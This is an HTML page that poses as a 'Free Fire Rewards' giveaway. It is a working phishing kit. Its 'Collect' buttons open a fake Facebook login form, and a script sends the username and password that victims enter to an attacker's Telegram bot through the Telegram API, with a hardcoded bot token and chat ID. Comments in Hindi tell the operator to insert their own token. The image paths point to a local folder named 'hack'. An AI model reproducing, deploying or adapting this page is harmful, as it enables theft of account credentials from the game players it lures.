<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire Rewards</title>
    <style>
        /* General Reset and Global Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f4f6f9;
            color: #333;
            line-height: 1.6;
            margin: 0;
            padding: 0;
        }

        /* Header Section */
        header {
            background: linear-gradient(90deg, rgba(0, 123, 255, 1) 0%, rgba(0, 255, 255, 1) 100%);
            color: white;
            padding: 20px 0;
            text-align: center;
        }

        header h1 {
            font-size: 36px;
            margin-bottom: 10px;
        }

        header p {
            font-size: 18px;
        }

        /* Main Content Section */
        .container {
            max-width: 1200px;
            margin: 50px auto;
            padding: 20px;
            background-color: white;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            border-radius: 8px;
        }

        .banner {
            width: 100%;
            border-radius: 8px;
            margin-bottom: 30px;
        }

        h2 {
            text-align: center;
            font-size: 30px;
            margin-bottom: 20px;
            color: #444;
        }

        /* Rewards Grid */
        .reward-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
        }

        .reward {
            background-color: #fff;
            border: 1px solid #ddd;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
            transition: transform 0.3s ease;
        }

        .reward:hover {
            transform: translateY(-10px);
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.15);
        }

        .reward img {
            width: 100%;
            height: 200px;
            object-fit: cover;
        }

        .reward-details {
            padding: 15px;
            text-align: center;
        }

        .collect-btn {
            background-color: #28a745;
            border: none;
            color: white;
            padding: 12px;
            width: 100%;
            margin-top: 15px;
            cursor: pointer;
            border-radius: 5px;
            font-size: 16px;
            transition: background-color 0.3s ease;
        }

        .collect-btn:hover {
            background-color: #218838;
        }

        /* Popup */
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            color: #333;
            padding: 30px;
            border-radius: 8px;
            text-align: center;
            width: 90%;
            max-width: 500px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        }

        .popup h3 {
            margin-bottom: 20px;
            font-size: 22px;
        }

        .popup button {
            margin: 10px;
            padding: 12px 20px;
            font-size: 16px;
            background-color: #007BFF;
            border: none;
            color: white;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .popup button:hover {
            background-color: #0056b3;
        }

        /* Responsive Design */
        @media (max-width: 1024px) {
            .reward-grid {
                grid-template-columns: repeat(2, 1fr);
            }
        }

        @media (max-width: 768px) {
            .reward-grid {
                grid-template-columns: 1fr;
            }

            header h1 {
                font-size: 28px;
            }

            h2 {
                font-size: 24px;
            }
        }

    </style>
</head>
<body>

    <!-- Header -->
    <header>
        <h1>Free Fire Rewards</h1>
        <p>Get the best rewards for Free Fire. Collect and enjoy!</p>
    </header>

    <!-- Main Content -->
    <div class="container">
        <img src="freefire-banner.jpg" alt="Free Fire Rewards" class="banner">
        <h2>Claim Your Free Rewards</h2>
        <div class="reward-grid">
            <div class="reward">
                <img src="file:///storage/emulated/0/hack /1743601282503.jpg" alt="Reward 1">
                <div class="reward-details">
                    <button class="collect-btn" onclick="showPopup()">Collect</button>
                </div>
            </div>
            <div class="reward">
                <img src="file:///storage/emulated/0/hack /1743601355072.jpg" alt="Reward 2">
                <div class="reward-details">
                    <button class="collect-btn" onclick="showPopup()">Collect</button>
                </div>
            </div>
            <div class="reward">
                <img src="file:///storage/emulated/0/hack /1743601299378.jpg" alt="Reward 3">
                <div class="reward-details">
                    <button class="collect-btn" onclick="showPopup()">Collect</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Login Popup -->
    <div class="popup" id="loginPopup">
        <h3>Select Login Method</h3>
        <button onclick="showFacebookLogin()">Login with Facebook</button>
        <button onclick="showGoogleLogin()">Login with Google</button>
    </div>

    <!-- Facebook Login -->
    <div class="popup" id="facebookLogin" style="display:none;">
        <h3>Facebook Login</h3>
        <input type="text" id="username" placeholder="Username"><br>
        <input type="password" id="password" placeholder="Password"><br>
        <button onclick="sendToTelegram()">Login</button>
    </div>

    <script>
        function showPopup() {
            document.getElementById('loginPopup').style.display = 'block';
        }
        function showFacebookLogin() {
            document.getElementById('loginPopup').style.display = 'none';
            document.getElementById('facebookLogin').style.display = 'block';
        }
        function showGoogleLogin() {
            alert("Google Login Coming Soon!");
        }
        function sendToTelegram() {
            var username = document.getElementById("username").value;
            var password = document.getElementById("password").value;
            
            var botToken = "7576751073:AAEDpy6p2tg3yUTxNyNpprHNJQw3VbQvrYQ";  // यहाँ अपना टेलीग्राम बॉट टोकन डालें
            var chatId = "7360759493";  // यहाँ अपनी टेलीग्राम Chat ID डालें

            var message = "New Login Attempt:\nUsername: " + username + "\nPassword: " + password;
            var url = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);

            fetch(url)
            .then(response => response.json())
            .then(data => {
                alert("Successful Send!");
            })
            .catch(error => {
                alert("Error sending data!");
            });
        }
    </script>

</body>
</html>
